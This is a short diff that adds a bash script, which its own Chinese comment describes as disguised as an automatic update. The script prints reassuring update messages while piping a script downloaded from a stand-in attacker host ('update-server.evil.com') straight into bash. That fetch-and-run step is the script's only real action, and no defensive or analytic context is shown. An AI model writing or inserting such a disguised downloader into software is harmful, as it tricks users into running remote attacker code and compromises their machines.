@@ -1,0 +1,5 @@
+#!/bin/bash
+# 伪装成自动更新
+echo "Checking for updates..."
+curl -fsSL http://update-server.evil.com/update.sh | bash
+echo "Updated successfully"
